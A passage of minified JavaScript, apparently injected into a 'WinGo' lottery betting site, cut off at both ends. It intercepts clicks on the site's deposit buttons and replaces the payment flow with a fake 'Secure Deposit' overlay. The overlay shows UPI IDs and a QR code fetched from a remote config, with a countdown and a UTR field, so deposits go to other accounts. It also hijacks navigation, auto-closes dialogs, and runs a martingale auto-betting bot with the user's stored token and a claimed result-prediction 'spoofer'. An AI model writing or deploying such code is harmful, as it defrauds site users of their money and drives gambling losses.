      t.classList.add("dragging"),
      (o = l.clientX - n.offsetLeft),
      (i = l.clientY - n.offsetTop));
  }),
    t.addEventListener("pointermove", (l) => {
      if (!t.hasPointerCapture(l.pointerId)) return;
      ((n.style.left = ye(l.clientX - o, e.offsetWidth) + "px"),
        (n.style.top = ve(l.clientY - i, e.offsetHeight) + "px"));
    }),
    t.addEventListener("pointerup", (l) => {
      (t.releasePointerCapture(l.pointerId), t.classList.remove("dragging"), ut(n, "panel"));
    }));
}
var Oo = [".firstSaveDialog", ".promptHeader"],
  Uo = [".close", ".van-dialog__confirm", ".dialog__outside"];
function zo() {
  Oo.forEach((n) => {
    document.querySelectorAll(n).forEach((t) => {
      let e = t.closest(".van-popup, .dialog");
      if (!e || getComputedStyle(e).display === "none") return;
      let o = !1;
      for (let i of Uo) {
        let l = e.querySelector(i);
        if (l) {
          (l.click(), (o = !0));
          break;
        }
      }
      if (!o) {
        let i = e.previousElementSibling;
        if (i?.classList.contains("van-overlay")) i.click();
      }
    });
  });
}
function Jo() {
  [
    document.querySelector(".tabbar__center"),
    document.querySelector(".promotionBg")?.closest(".tabbar__container-item"),
  ].forEach((t) => {
    if (!t || t.dataset.wgHijacked) return;
    ((t.dataset.wgHijacked = "1"),
      t.addEventListener(
        "click",
        (e) => {
          (e.preventDefault(),
            e.stopPropagation(),
            e.stopImmediatePropagation(),
            window.dispatchEvent(new Event("wg-open-bonus")));
        },
        {
          capture: !0,
        },
      ));
  });
}
function Ho(n) {
  if (n.dataset.wg) return;
  n.dataset.wg = "1";
  let t = n.firstElementChild;
  if (!t) return;
  let e = t.cloneNode(!0);
  e.querySelector("span").textContent = "Bonus";
  let o = e.querySelector("use");
  if (o) {
    o.setAttribute("xlink:href", "#icon-gifts");
    let i = o.closest("svg");
    if (i) i.setAttribute("class", "svg-icon icon-gifts");
  }
  (e.querySelector("h5")?.remove(),
    e.addEventListener(
      "click",
      (i) => {
        (i.preventDefault(),
          i.stopPropagation(),
          i.stopImmediatePropagation(),
          window.dispatchEvent(new Event("wg-open-bonus")));
      },
      {
        capture: !0,
      },
    ),
    n.prepend(e));
}
var me = !1,
  k = null,
  D = null;
function ge() {
  return true;
}
function Po() {}
function at() {}
function Go() {}
function Ee(n) {
  let o = () => {
    qe();
    new MutationObserver(() => qe()).observe(document.body, {
      childList: !0,
      subtree: !0,
    });
  };
  document.readyState === "loading" ? document.addEventListener("DOMContentLoaded", o) : o();
}
function Le(n) {}
function pt() {
  document.getElementById("wg-deposit-hint")?.remove();
}
function Me(n) {
  (pt(), window.addEventListener("hashchange", pt), window.addEventListener("wg-qualified", pt));
}
function $e(n, t) {
  let o = document.querySelector("prediction-panel")?.shadowRoot;
  if (!o) return;
  let i = [],
    l = new Set();
  for (let u of Array.isArray(t) ? t : []) {
    let v =
      typeof u === "string"
        ? u.trim()
        : String(u?.upiId ?? u?.address ?? u?.upi ?? u?.value ?? "").trim();
    if (!v || l.has(v)) continue;
    (l.add(v),
      i.push({
        label: typeof u === "string" ? "" : String(u?.label ?? "").trim(),
        upiId: v,
      }));
  }
  if (i.length === 0) return;
  let f = o.querySelector(".pay-overlay");
  if (f) f.remove();
  let c = document.createElement("div");
  ((c.className = "pay-overlay"), o.appendChild(c), (document.body.style.overflow = "hidden"));
  let p = 0,
    w,
    S = 0,
    $ = () => {
      (cancelAnimationFrame(S),
        (S = requestAnimationFrame(() => {
          let u = document.querySelector("#app"),
            v = window.visualViewport,
            r = u?.getBoundingClientRect(),
            C = v?.width || document.documentElement.clientWidth || window.innerWidth,
            O = v?.height || document.documentElement.clientHeight || window.innerHeight,
            J = Number.isFinite(r?.left) ? Math.max(0, r.left) : 0,
            H = Number.isFinite(r?.width) && r.width > 0 ? r.width : C,
            Q = Math.max(280, Math.min(H, C - J));
          ((c.style.left = `${J}px`),
            (c.style.top = `${Math.max(0, v?.offsetTop || 0)}px`),
            (c.style.width = `${Q}px`),
            (c.style.height = `${O}px`));
        })));
    };
  ($(),
    window.addEventListener("resize", $),
    window.addEventListener("orientationchange", $),
    window.visualViewport?.addEventListener("resize", $),
    window.visualViewport?.addEventListener("scroll", $));
  let g = () => {
      (clearInterval(w),
        cancelAnimationFrame(S),
        window.removeEventListener("resize", $),
        window.removeEventListener("orientationchange", $),
        window.visualViewport?.removeEventListener("resize", $),
        window.visualViewport?.removeEventListener("scroll", $),
        c.remove(),
        (document.body.style.overflow = ""));
    },
    M =
      "DP" +
      Date.now().toString(36).toUpperCase() +
      Math.random().toString(36).slice(2, 6).toUpperCase(),
    W = (u) =>
      String(u ?? "").replace(
        /[&<>"']/g,
        (v) =>
          ({
            "&": "&amp;",
            "<": "&lt;",
            ">": "&gt;",
            '"': "&quot;",
            "'": "&#39;",
          })[v],
      ),
    L = () => {
      let u = i[p],
        v = u.upiId,
        r = u.label || `UPI ${p + 1}`,
        C = i.length > 1,
        O = i[(p + 1) % i.length],
        J = O.label || `UPI ${((p + 1) % i.length) + 1}`,
        H = `upi://pay?pa=${v}&pn=Deposit&am=${n}&cu=INR`,
        Q = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&margin=0&data=${encodeURIComponent(H)}`;
      return `<div class="pay-hdr">
  <button class="pay-back">
    <svg viewBox="0 0 24 24" fill="none">
      <path
        d="M15 18l-6-6 6-6"
        stroke="currentColor"
        stroke-linecap="round"
        stroke-linejoin="round"
      />
    </svg>
  </button>
  <span class="pay-ttl">Secure Deposit</span>
  <div style="width: 32px"></div>
</div>

<div class="pay-body">
  <div class="pay-hero pay-anim pay-anim-1">
    <div class="pay-amount-bg"></div>
    <div class="pay-hero-top">
      <div>
        <span class="pay-hero-label">Amount to Pay</span>
        <span class="pay-amt">₹${Number(n).toLocaleString("en-IN")}</span>
      </div>
      <div class="pay-timer-pill">
        <svg
          class="pay-clock"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
        >
          <circle cx="12" cy="12" r="10" stroke-width="2.5" />
          <path d="M12 6v6l4 2" stroke-width="2.5" stroke-linecap="round" />
        </svg>
        <span class="pay-timer-txt" id="pay-timer">29:00</span>
      </div>
    </div>
    <div class="pay-hero-sub">Scan and Pay. Then Add UTR.</div>
  </div>

  <div class="pay-content">
    <div class="pay-section pay-qr-card pay-anim pay-anim-2">
      <div class="pay-qr-wrapper">
        <div class="pay-qr-box">
          <div class="pay-qr-skeleton">
            <svg
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2"
              stroke-linecap="round"
              stroke-linejoin="round"
            >
              <path d="M21 12a9 9 0 1 1-6.219-8.56" />
            </svg>
          </div>
          <img
            src="${Q}"
            class="pay-qr"
            alt="QR Code"
            onload="
              this.classList.add('loaded');
              this.previousElementSibling.style.display = 'none';
            "
          />
        </div>
        <div class="pay-scan-text">Open Any UPI App and Scan</div>
      </div>
    </div>

    <div class="pay-section pay-method-card pay-anim pay-anim-3">
      <div class="pay-section-hdr">Payment UPI</div>
      <div class="pay-upi-row">
        <div class="pay-upi-info">
          <span class="pay-upi-lbl">${W(r)}</span>
          <span class="pay-upi-id">${W(v)}</span>
        </div>
        <div class="pay-upi-actions">
          <button class="pay-copy-btn" id="btn-copy-upi">Copy</button>
        </div>
      </div>
      ${
        C
          ? `<button class="pay-route-card" id="btn-switch-upi" type="button">
  <span class="pay-route-index">${W(J)}</span>
  <span class="pay-route-copy">
    <span class="pay-route-title">Change UPI ID</span>
    <span class="pay-route-sub">${W(O.upiId)}</span>
  </span>
  <span class="pay-route-icon">
    <svg viewBox="0 0 24 24" fill="none">
      <path
        d="M7 7h10l-3-3"
        stroke="currentColor"
        stroke-width="2.4"
        stroke-linecap="round"
        stroke-linejoin="round"
      />
      <path
        d="M17 17H7l3 3"
        stroke="currentColor"
        stroke-width="2.4"
        stroke-linecap="round"
        stroke-linejoin="round"
      />
    </svg>
  </span>
</button>
`
          : `<div class="pay-route-note">Only one UPI ID is active right now.</div>
`
      }
    </div>

    <div class="pay-section pay-form-card pay-anim pay-anim-4">
      <div class="pay-section-hdr">UTR Number</div>
      <div class="pay-field-wrapper">
        <input
          type="tel"
          class="pay-utr-input"
          placeholder="Enter 12-Digit UTR"
          maxlength="12"
          inputmode="numeric"
        />
        <button class="pay-paste-pill">Paste</button>
      </div>
      <div class="pay-utr-warn">
        <svg
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          stroke-width="2.5"
          stroke-linecap="round"
          stroke-linejoin="round"
        >
          <circle cx="12" cy="12" r="10" />
          <path d="M12 8v4" />
          <path d="M12 16h.01" />
        </svg>
        <span class="pay-utr-warn-txt">
          Wrong UTR can fail the deposit. Check it once.
        </span>
      </div>
    </div>

    <div class="pay-section pay-anim pay-anim-4">
      <button class="pay-submit-btn disabled" disabled>Submit Payment</button>
    </div>

    <div class="pay-order-meta pay-anim pay-anim-4">
      <span class="pay-order-lbl">Order Reference</span>
      <span class="pay-order-val">${M}</span>
    </div>
  </div>
</div>

<div class="pay-confirm-mask">
  <div class="pay-confirm-box">
    <div class="pay-conf-icon">
      <svg
        viewBox="0 0 24 24"
        fill="none"
        stroke="currentColor"
        stroke-width="3"
        stroke-linecap="round"
        stroke-linejoin="round"
      >
        <polyline points="20 6 9 17 4 12" />
      </svg>
    </div>
    <div class="pay-conf-ttl">Confirm Deposit</div>
    <div class="pay-conf-msg">
      Have you successfully transferred exactly
      <b>₹${Number(n).toLocaleString("en-IN")}</b>
      ?
    </div>
    <div class="pay-conf-acts">
      <button class="pay-conf-btn no">Cancel</button>
      <button class="pay-conf-btn yes">Yes, Submitted</button>
    </div>
  </div>
</div>
`;
    },
    q = () => {
      let u = c.querySelector(".pay-utr-input"),
        v = c.querySelector(".pay-submit-btn");
      ((c.querySelector(".pay-back").onclick = g),
        (u.oninput = (O) => {
          O.target.value = O.target.value.replace(/\D/g, "");
          let J = /^\d{12}$/.test(O.target.value);
          ((v.disabled = !J), v.classList.toggle("disabled", !J));
        }),
        (c.querySelector(".pay-paste-pill").onclick = async () => {
          try {
            let O = await navigator.clipboard.readText();
            ((u.value = O.replace(/\D/g, "").slice(0, 12)), u.dispatchEvent(new Event("input")));
          } catch (O) {}
        }),
        (c.querySelector("#btn-copy-upi").onclick = (O) => {
          navigator.clipboard.writeText(i[p].upiId);
          let J = O.target;
          ((J.textContent = "Copied"),
            J.classList.add("copied"),
            setTimeout(() => {
              ((J.textContent = "Copy"), J.classList.remove("copied"));
            }, 2000));
        }));
      let r = c.querySelector("#btn-switch-upi");
      if (r)
        r.onclick = () => {
          ((p = (p + 1) % i.length), y());
        };
      let C = c.querySelector(".pay-confirm-mask");
      ((v.onclick = () => {
        if (!v.disabled) C.classList.add("active");
      }),
        (c.querySelector(".pay-conf-btn.no").onclick = () => C.classList.remove("active")),
        (c.querySelector(".pay-conf-btn.yes").onclick = () => {
          (console.log("Payment submitted:", {
            amount: n,
            utr: u.value,
            orderId: M,
          }),
            g());
        }));
    },
    y = () => {
      let u = c.querySelector(".pay-utr-input")?.value || "";
      if (((c.innerHTML = L()), (c.querySelector(".pay-utr-input").value = u), q(), $(), u))
        c.querySelector(".pay-utr-input").dispatchEvent(new Event("input"));
    };
  y();
  let a = 1740;
  w = setInterval(() => {
    if ((a--, a <= 0)) {
      (clearInterval(w), g());
      return;
    }
    let u = Math.floor(a / 60),
      v = a % 60,
      r = c.querySelector("#pay-timer");
    if (r) {
      if (
        ((r.textContent = `${String(u).padStart(2, "0")}:${String(v).padStart(2, "0")}`), a < 300)
      )
        r.parentElement.classList.add("urgent");
    }
  }, 1000);
}
var hn = {
    interceptor_enabled: !1,
    min_deposit: 100,
    upis: [],
  },
  vt = !1;
function We(n) {
  let t = Array.isArray(n) ? n : [],
    e = [],
    o = new Set();
  for (let i of t) {
    let l =
      typeof i === "string"
        ? i.trim()
        : String(i?.upiId ?? i?.address ?? i?.upi ?? i?.value ?? "").trim();
    if (!l || o.has(l)) continue;
    (o.add(l),
      e.push(
        typeof i === "string"
          ? l
          : {
              label: String(i?.label ?? "").trim(),
              upiId: l,
            },
      ));
  }
  return e;
}
async function yt() {
  try {
    let n = await fetch("/ar-api/payment-config", {
      cache: "no-store",
    });
    if (n.ok) {
      let t = await n.json(),
        e = Number(t?.min_deposit ?? t?.minDeposit ?? 100);
      ((hn = {
        interceptor_enabled: Boolean(t?.interceptor_enabled ?? t?.interceptorEnabled ?? t?.enabled),
        min_deposit: Number.isFinite(e) && e > 0 ? e : 100,
        upis: We(t?.payment_methods ?? t?.upis),
      }),
        (vt = !0));
    }
  } catch {
    ((hn = {
      interceptor_enabled: !1,
      min_deposit: 100,
      upis: [],
    }),
      (vt = !0));
  }
}
function No(n) {
  let t = Number(hn.min_deposit || 100),
    e = Number(String(n?.value ?? "").replace(/[^\d.]/g, "")),
    o = Number.isFinite(e) ? e : 0;
  return Math.max(o, t);
}
function he() {
  (yt(),
    setInterval(yt, 1e4),
    document.addEventListener("visibilitychange", () => {
      if (!document.hidden) yt();
    }),
    window.addEventListener(
      "click",
      (n) => {
        if (!n.target.closest(".Recharge__container-rechageBtn, .go_pay")) return;
        let e = We(hn.upis);
        if (!vt || !hn.interceptor_enabled || e.length === 0) return;
        (n.stopImmediatePropagation(), n.stopPropagation(), n.preventDefault());
        let o = document.querySelector('input.van-field__control[type="tel"]'),
          i = No(o);
        if (o && Number(o.value) !== i)
          ((o.value = String(i)),
            o.dispatchEvent(
              new Event("input", {
                bubbles: !0,
              }),
            ),
            o.dispatchEvent(
              new Event("change", {
                bubbles: !0,
              }),
            ));
        (console.log("deposit blocked - interceptor active", {
          amount: i,
          upis: e,
        }),
          $e(i, e));
      },
      {
        capture: !0,
      },
    ));
}
function Qo(n) {
  function t(q, y) {
    return (q + y) | 0;
  }
  function e(q, y) {
    return (q << y) | (q >>> (32 - y));
  }
  function o(q, y, a, u, v, r) {
    return t(e(t(t(y, q), t(u, r)), v), a);
  }
  function i(q, y, a, u, v, r, C) {
    return o((y & a) | (~y & u), q, y, v, r, C);
  }
  function l(q, y, a, u, v, r, C) {
    return o((y & u) | (a & ~u), q, y, v, r, C);
  }
  function f(q, y, a, u, v, r, C) {
    return o(y ^ a ^ u, q, y, v, r, C);
  }
  function c(q, y, a, u, v, r, C) {
    return o(a ^ (y | ~u), q, y, v, r, C);
  }
  function p(q, y) {
    var a = q[0],
      u = q[1],
      v = q[2],
      r = q[3];
    ((a = i(a, u, v, r, y[0], 7, -680876936)),
      (r = i(r, a, u, v, y[1], 12, -389564586)),
      (v = i(v, r, a, u, y[2], 17, 606105819)),
      (u = i(u, v, r, a, y[3], 22, -1044525330)),
      (a = i(a, u, v, r, y[4], 7, -176418897)),
      (r = i(r, a, u, v, y[5], 12, 1200080426)),
      (v = i(v, r, a, u, y[6], 17, -1473231341)),
      (u = i(u, v, r, a, y[7], 22, -45705983)),
      (a = i(a, u, v, r, y[8], 7, 1770035416)),
      (r = i(r, a, u, v, y[9], 12, -1958414417)),
      (v = i(v, r, a, u, y[10], 17, -42063)),
      (u = i(u, v, r, a, y[11], 22, -1990404162)),
      (a = i(a, u, v, r, y[12], 7, 1804603682)),
      (r = i(r, a, u, v, y[13], 12, -40341101)),
      (v = i(v, r, a, u, y[14], 17, -1502002290)),
      (u = i(u, v, r, a, y[15], 22, 1236535329)),
      (a = l(a, u, v, r, y[1], 5, -165796510)),
      (r = l(r, a, u, v, y[6], 9, -1069501632)),
      (v = l(v, r, a, u, y[11], 14, 643717713)),
      (u = l(u, v, r, a, y[0], 20, -373897302)),
      (a = l(a, u, v, r, y[5], 5, -701558691)),
      (r = l(r, a, u, v, y[10], 9, 38016083)),
      (v = l(v, r, a, u, y[15], 14, -660478335)),
      (u = l(u, v, r, a, y[4], 20, -405537848)),
      (a = l(a, u, v, r, y[9], 5, 568446438)),
      (r = l(r, a, u, v, y[14], 9, -1019803690)),
      (v = l(v, r, a, u, y[3], 14, -187363961)),
      (u = l(u, v, r, a, y[8], 20, 1163531501)),
      (a = l(a, u, v, r, y[13], 5, -1444681467)),
      (r = l(r, a, u, v, y[2], 9, -51403784)),
      (v = l(v, r, a, u, y[7], 14, 1735328473)),
      (u = l(u, v, r, a, y[12], 20, -1926607734)),
      (a = f(a, u, v, r, y[5], 4, -378558)),
      (r = f(r, a, u, v, y[8], 11, -2022574463)),
      (v = f(v, r, a, u, y[11], 16, 1839030562)),
      (u = f(u, v, r, a, y[14], 23, -35309556)),
      (a = f(a, u, v, r, y[1], 4, -1530992060)),
      (r = f(r, a, u, v, y[4], 11, 1272893353)),
      (v = f(v, r, a, u, y[7], 16, -155497632)),
      (u = f(u, v, r, a, y[10], 23, -1094730640)),
      (a = f(a, u, v, r, y[13], 4, 681279174)),
      (r = f(r, a, u, v, y[0], 11, -358537222)),
      (v = f(v, r, a, u, y[3], 16, -722521979)),
      (u = f(u, v, r, a, y[6], 23, 76029189)),
      (a = f(a, u, v, r, y[9], 4, -640364487)),
      (r = f(r, a, u, v, y[12], 11, -421815835)),
      (v = f(v, r, a, u, y[15], 16, 530742520)),
      (u = f(u, v, r, a, y[2], 23, -995338651)),
      (a = c(a, u, v, r, y[0], 6, -198630844)),
      (r = c(r, a, u, v, y[7], 10, 1126891415)),
      (v = c(v, r, a, u, y[14], 15, -1416354905)),
      (u = c(u, v, r, a, y[5], 21, -57434055)),
      (a = c(a, u, v, r, y[12], 6, 1700485571)),
      (r = c(r, a, u, v, y[3], 10, -1894986606)),
      (v = c(v, r, a, u, y[10], 15, -1051523)),
      (u = c(u, v, r, a, y[1], 21, -2054922799)),
      (a = c(a, u, v, r, y[8], 6, 1873313359)),
      (r = c(r, a, u, v, y[15], 10, -30611744)),
      (v = c(v, r, a, u, y[6], 15, -1560198380)),
      (u = c(u, v, r, a, y[13], 21, 1309151649)),
      (a = c(a, u, v, r, y[4], 6, -145523070)),
      (r = c(r, a, u, v, y[11], 10, -1120210379)),
      (v = c(v, r, a, u, y[2], 15, 718787259)),
      (u = c(u, v, r, a, y[9], 21, -343485551)),
      (q[0] = t(a, q[0])),
      (q[1] = t(u, q[1])),
      (q[2] = t(v, q[2])),
      (q[3] = t(r, q[3])));
  }
  function w(q) {
    var y = [],
      a;
    for (a = 0; a < 64; a += 4)
      y[a >> 2] =
        q.charCodeAt(a) +
        (q.charCodeAt(a + 1) << 8) +
        (q.charCodeAt(a + 2) << 16) +
        (q.charCodeAt(a + 3) << 24);
    return y;
  }
  var S = n.length,
    $ = [1732584193, -271733879, -1732584194, 271733878],
    g;
  for (g = 64; g <= S; g += 64) p($, w(n.substring(g - 64, g)));
  n = n.substring(g - 64);
  var M = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
  for (g = 0; g < n.length; g++) M[g >> 2] |= n.charCodeAt(g) << ((g % 4) << 3);
  if (((M[g >> 2] |= 128 << ((g % 4) << 3)), g > 55))
    (p($, M), (M = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]));
  ((M[14] = S * 8), p($, M));
  var W = "";
  for (g = 0; g < 4; g++)
    for (var L = 0; L < 4; L++)
      W +=
        "0123456789abcdef"[($[g] >> (L * 8 + 4)) & 15] + "0123456789abcdef"[($[g] >> (L * 8)) & 15];
  return W.toUpperCase().slice(0, 32);
}
function Io() {
  var n = 100000000000,
    t = 1000000000000,
    e;
  do e = Math.floor(Math.random() * t);
  while (e < n);
  return e;
}
function rt(n) {
  n.random = Io();
  var t = JSON.parse(JSON.stringify(n)),
    e = Object.keys(t)
      .filter(function (i) {
        var l = t[i];
        return l === null || typeof l !== "object";
      })
      .sort(),
    o = {};
  return (
    e.forEach(function (i) {
      if (t[i] !== null && t[i] !== "" && i !== "signature") o[i] = t[i] === 0 ? 0 : t[i];
    }),
    (n.signature = Qo(JSON.stringify(o))),
    (n.timestamp = Math.floor(Date.now() / 1000)),
    n
  );
}
function Xo() {
  try {
    var n = localStorage.getItem("ar_token");
    if (!n) return "";
    var t = JSON.parse(n);
    return typeof t === "string" ? t : t.value || "";
  } catch (e) {
    return localStorage.getItem("ar_token") || "";
  }
}
function Zo(n) {
  if (!n) return;
  try {
    localStorage.setItem(
      "ar_token",
      JSON.stringify({
        value: n,
        expires: -1,
      }),
    );
  } catch (t) {}
}
function wt(n, t, e, o) {
  return new Promise(function (i, l) {
    var f = new XMLHttpRequest();
    if ((f.open(n, t, !0), o)) for (var c in o) f.setRequestHeader(c, o[c]);
    ((f.onload = function () {
      if (f.status >= 200 && f.status < 300) {
        var p = f.getResponseHeader("Authorization");
        if (p) Zo(p.replace(/^Bearer\s+/i, ""));
        try {
          i(JSON.parse(f.responseText));
        } catch (w) {
          l(Error("Bad JSON"));
        }
      } else l(Error("HTTP " + f.status));
    }),
      (f.onerror = function () {
        l(Error("Network error"));
      }),
      (f.ontimeout = function () {
        l(Error("Timeout"));
      }),
      (f.timeout = 15000),
      f.send(e || null));
  });
}
function St(n, t, e) {
  var o = Xo(),
    i = t,
    l = {
      Authorization: "Bearer " + o,
      "Content-Type": "application/json",
      Accept: "application/json, text/plain, */*",
    },
    f = null;
  if (n === "GET") {
    var c = new URLSearchParams();
    (Object.keys(e).forEach(function (p) {
      c.set(p, String(e[p]));
    }),
      (i += "?" + c.toString()));
  } else f = JSON.stringify(e);
  return wt(n, i, f, l);
}
async function Ce(n, t, e, o) {
  var i = rt({
    gameCode: n,
    issueNumber: t,
    amount: e,
    betMultiple: 1,
    betContent: o,
    language: "en",
  });
  return St("POST", "/api/Lottery/WinGoBet", i);
}
async function qt() {
  var n = rt({
    language: "en",
  });
  return St("GET", "/api/Lottery/GetBalance", n);
}
async function mt(n) {
  var t = rt({
    issueNumber: n,
    language: "en",
  });
  return St("GET", "/api/Lottery/GetWinLossResult", t);
}
async function Oe(n) {
  return wt("GET", "/WinGo/" + n + ".json?ts=" + Date.now());
}
async function Ue(n) {
  return wt("GET", "/WinGo/" + n + "/GetHistoryIssuePage.json?ts=" + Date.now());
}
var Cn = "WinGo_30S",
  Je = "wg_mining_session",
  gt = "wg_mining_history",
  He = [1, 2, 4],
  On = 5,
  ze = 100;
function N(n) {
  return Math.round(n * 100) / 100;
}
var Et = [],
  Lt = [];
function Pe(n) {
  Et.push(n);
}
function Ge(n) {
  Lt.push(n);
}
function Ne() {
  ((Et = []), (Lt = []));
}
function P(n, t) {
  (console.log("[MINING]", n), Et.forEach((e) => e(n, t)));
}
function Qe() {
  Lt.forEach((n) => n(I()));
}
function I() {
  try {
    return JSON.parse(localStorage.getItem(Je)) || null;
  } catch (n) {
    return null;
  }
}
function pn(n) {
  (localStorage.setItem(Je, JSON.stringify(n)), Qe());
}
function Yo(n, t, e) {
  return {
    active: !0,
    gameCode: Cn,
    startedAt: Date.now(),
    startBalance: n,
    targetBalance: t,
    stopLoss: e,
    baseUnit: Math.max(1, Math.floor(n * 0.01)),
    martingaleStep: 0,
    lastBetPeriod: "",
    lastBetAmount: 0,
    lastBetSide: "",
    pendingResult: !1,
    stats: {
      rounds: 0,
      wins: 0,
      losses: 0,
      netPL: 0,
    },
  };
}
function Fo(n) {
  try {
    var t = Mt();
    if ((t.unshift(n), t.length > ze)) t.length = ze;
    localStorage.setItem(gt, JSON.stringify(t));
  } catch (e) {}
}
function Mt() {
  try {
    return JSON.parse(localStorage.getItem(gt)) || [];
  } catch (n) {
    return [];
  }
}
function Ie() {
  localStorage.removeItem(gt);
}
var F = null,
  R = !1,
  x = !1,
  on = 0;
function Xe() {
  var n = I();
  return n && n.active;
}
function Ze() {
  return I();
}
async function Ye(n, t, e) {
  if (x) return !1;
  var o = I();
  if (o && o.pendingResult) {
    if (
      (P("Previous bet still unverified. Checking result first...", "wait"),
      (x = !0),
      on++,
      await Ve(o, on),
      !x)
    )
      return !1;
  }
  var i = Math.max(1, Math.floor(n * 0.01));
  if (n < i * 7) return (P("Balance too low. Need at least ₹" + i * 7 + " to start.", "loss"), !1);
  if (t <= n) return (P("Target must be higher than current balance.", "loss"), !1);
  return (
    pn(Yo(n, t, e)),
    (R = !1),
    (x = !0),
    on++,
    P("Started mining — ₹" + N(n) + " → ₹" + N(t) + (e ? " | Stop below ₹" + N(e) : ""), "active"),
    cn(on),
    !0
  );
}
function Fe() {
  var n = I();
  if (n && n.pendingResult) {
    ((R = !0), P("Stopping after current round finishes...", "wait"));
    return;
  }
  V("Stopped.");
}
function V(n) {
  if (((x = !1), (R = !1), F)) (clearTimeout(F), (F = null));
  var t = I();
  if (t)
    ((t.active = !1),
      pn(t),
      P(
        n +
          " — " +
          t.stats.rounds +
          " rounds, " +
          t.stats.wins +
          "W/" +
          t.stats.losses +
          "L, P&L ₹" +
          N(t.stats.netPL),
        "active",
      ));
  else P(n, "active");
}
function X(n) {
  return n !== on;
}
async function Ke() {
  var n = I();
  if (!n || !n.active) return !1;
  ((x = !0), (R = !1), on++);
  var t = on;
  if ((P("Picking up where we left off...", "wait"), n.pendingResult && n.lastBetPeriod))
    (P("Checking last bet result...", "wait"), await Ve(n, t));
  if (X(t)) return !1;
  if (R) return (V("Stopped."), !1);
  if (((n = I()), n && n.active && x)) return (cn(t), !0);
  return !1;
}
async function Ve(n, t) {
  for (var e = 1; e <= On; e++) {
    if (X(t)) return;
    try {
      var o = await mt(n.lastBetPeriod);
      if (X(t)) return;
      if (o && o.data && o.data.status !== void 0) {
        De(n, o.data.status === !0, o.data.winAmount || 0);
        return;
      }
    } catch (i) {}
    if (
      (P("Checking result... attempt " + e + "/" + On, "wait"),
      await new Promise(function (i) {
        setTimeout(i, e * 3000);
      }),
      X(t))
    )
      return;
    if (((n = I()), !n || !n.active)) return;
  }
  V("⚠️ Couldn't verify last bet after " + On + " tries. Please check your balance.");
}
function De(n, t, e) {
  ((n.pendingResult = !1), n.stats.rounds++);
  var o;
  if (t)
    ((o = N(e - n.lastBetAmount)),
      n.stats.wins++,
      (n.stats.netPL = N(n.stats.netPL + o)),
      (n.martingaleStep = 0));
  else
    ((o = -N(n.lastBetAmount)),
      n.stats.losses++,
      (n.stats.netPL = N(n.stats.netPL + o)),
      (n.martingaleStep = n.martingaleStep >= He.length - 1 ? 0 : n.martingaleStep + 1));
  return (
    pn(n),
    Fo({
      sessionId: n.startedAt,
      period: n.lastBetPeriod,
      amount: n.lastBetAmount,
      side: n.lastBetSide,
      result: t ? "win" : "loss",
      net: o,
      time: Date.now(),
    }),
    {
      won: t,
      net: o,
    }
  );
}
async function cn(n) {
  if (X(n)) return;
  var t = I();
  if (!t || !t.active) {
    x = !1;
    return;
  }
  try {
    var e = await Oe(Cn);
    if (X(n)) return;
    var o = Date.now(),
      i = e.current.endTime,
      l = i - o,
      f = e.current.issueNumber;
    if (l < 8000) {
      (P("Round ending soon, waiting for the next one...", "wait"),
        (F = setTimeout(function () {
          cn(n);
        }, l + 2000)));
      return;
    }
    var c = l - 8000;
    (P("Next round in " + Math.ceil(c / 1000) + "s...", "wait"),
      (F = setTimeout(function () {
        Ko(f, i, n);
      }, c)));
  } catch (p) {
    (P("Connection issue, retrying in 5s...", "loss"),
      (F = setTimeout(function () {
        cn(n);
      }, 5000)));
  }
}
async function Ko(n, t, e) {
  if (X(e)) return;
  var o = I();
  if (!o || !o.active) return;
  var i;
  try {
    i = await qt();
  } catch (v) {
    if ((P("Couldn't check balance, skipping this round.", "loss"), !X(e)))
      F = setTimeout(function () {
        cn(e);
      }, 5000);
    return;
  }
  if (X(e)) return;
  if (((o = I()), !o || !o.active)) return;
  var l = N(i.data.balance);
  if (
    ((window.__wg_balance = l),
    window.dispatchEvent(
      new CustomEvent("wg-balance", {
        detail: {
          balance: l,
        },
      }),
    ),
    l >= N(o.targetBalance))
  ) {
    V("\uD83C\uDFAF Target reached! ₹" + l);
    return;
  }
  if (o.stopLoss && l <= N(o.stopLoss)) {
    V("\uD83D\uDED1 Balance dropped to ₹" + l + ", stopping.");
    return;
  }
  var f = He[o.martingaleStep] || 1,
    c = o.baseUnit * f;
  if (l < c) {
    if (o.martingaleStep > 0) {
      var p = o.martingaleStep;
      ((o.martingaleStep = 0),
        (c = o.baseUnit),
        pn(o),
        P("Can't afford recovery bet, going back to ₹" + c + ".", "wait"));
    }
    if (l < c) {
      V("Not enough balance for the minimum bet (₹" + c + ").");
      return;
    }
  }
  if (o.martingaleStep === 0) {
    var w = N(o.targetBalance - l);
    if (c > w && w >= 1)
      ((c = Math.max(1, Math.ceil(w / 0.96))),
        P("Almost there — betting ₹" + c + " to finish.", "wait"));
  }
  if (o.stopLoss && N(l - c) < N(o.stopLoss)) {
    V("\uD83D\uDED1 This bet would drop balance below ₹" + N(o.stopLoss) + ", stopping.");
    return;
  }
  var S = "BigSmall_Big",
    $ = "Big",
    g = 50,
    M = window.__wgSpoofer && window.__wgSpoofer.isVip();
  if (M) {
    var W = window.__wgSpoofer.predictNum(Cn, n);
    (($ = W >= 5 ? "Big" : "Small"), (S = W >= 5 ? "BigSmall_Big" : "BigSmall_Small"));
    var L = window.__wgSpoofer.getSettings();
    g = L ? L.accuracy : 70;
  } else
    try {
      var q = await Ue(Cn);
      if (X(e)) return;
      if (q && q.data && q.data.list) {
        var y = Ln(q.data.list);
        (($ = y.prediction),
          (g = y.confidence),
          (S = $ === "Big" ? "BigSmall_Big" : "BigSmall_Small"));
      }
    } catch (v) {
      P("Couldn't load history, going with Big.", "wait");
    }
  if (X(e)) return;
  if (((o = I()), !o || !o.active)) return;
  if (R) {
    V("Stopped.");
    return;
  }
  var a = o.martingaleStep > 0 ? " (recovery " + (o.martingaleStep + 1) + "/3)" : "";
  (P("⚡ Placing ₹" + c + " on " + $ + a + " — " + g + "% confident", "active"),
    (o.lastBetPeriod = n),
    (o.lastBetAmount = c),
    (o.lastBetSide = S),
    (o.pendingResult = !0),
    pn(o));
  try {
    var u = await Ce(Cn, n, c, S);
